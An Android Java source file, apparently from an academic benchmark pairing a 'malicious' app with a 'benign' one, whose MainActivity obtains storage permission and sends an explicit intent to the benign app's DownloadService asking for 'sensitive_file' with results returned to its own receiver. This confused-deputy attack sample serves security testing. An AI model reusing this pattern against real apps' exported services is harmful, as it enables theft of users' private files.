package edu.ksu.cs.malicious;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    public static int REQ_CODE = 101;
    private static String TAG = "Malicious";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (checkPermission("android.permission.READ_EXTERNAL_STORAGE", android.os.Process.myPid(), android.os.Process.myUid()) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "android.permission.READ_EXTERNAL_STORAGE already granted");
            performAction();
        } else {
            Log.d(TAG, "need android.permission.READ_EXTERNAL_STORAGE permission");
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE"}, REQ_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int reqCode, String[] permissions, int[] grantResults){
        if(reqCode == REQ_CODE && permissions[0].equals("android.permission.READ_EXTERNAL_STORAGE")
                && grantResults[0] == PackageManager.PERMISSION_GRANTED){
            performAction();
        }
        else{
            throw new RuntimeException(new SecurityException());
        }
    }

    private void performAction(){
        findViewById(R.id.serviceButton).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("edu.ksu.cs.benign", "edu.ksu.cs.benign.DownloadService");
                intent.setPackage("edu.ksu.cs.benign");
                intent.putExtra("filename", "sensitive_file");
                intent.putExtra("confirmationPackage", getPackageName());
                intent.putExtra("confirmationReceiver", "edu.ksu.cs.malicious.ConfirmationReceiver");
                try {
                    startService(intent);
                } catch (SecurityException e) {
                    TextView txt = (TextView) findViewById(R.id.serviceInitiation);
                    txt.setText("SecurityException");
                }
            }
        });
    }
}
